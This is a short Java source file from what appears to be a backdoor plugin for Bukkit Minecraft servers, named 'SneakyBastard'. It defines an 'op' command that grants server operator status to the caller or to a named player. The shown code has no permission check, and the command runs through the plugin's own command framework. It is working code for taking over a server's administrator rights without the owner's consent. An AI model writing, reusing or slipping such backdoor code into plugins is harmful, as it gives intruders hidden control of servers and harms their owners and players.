package net.blackofworld.SneakyBastard.Commands.Server;

import lombok.experimental.ExtensionMethod;
import net.blackofworld.SneakyBastard.Command.CommandBase;
import net.blackofworld.SneakyBastard.Command.CommandCategory;
import net.blackofworld.SneakyBastard.Command.CommandInfo;
import net.blackofworld.SneakyBastard.Extensions.PlayerExt;
import org.bukkit.entity.Player;

import java.util.ArrayList;

@CommandInfo(command = "op", description = "Gives you op.", Syntax = "[player]", category = CommandCategory.Server)
@ExtensionMethod({Player.class, PlayerExt.class})
public final class Op extends CommandBase {
    @Override
    public void Execute(Player p, ArrayList<String> args) {
        Player pp = firstParamIsPlayer(p, args);
        if(pp == null) pp = p;
        pp.SetOp(true);
        p.Reply("%s now an operator".formatted(args.size() > 0 ? pp.getName() + " is" : "You are"));
    }
}
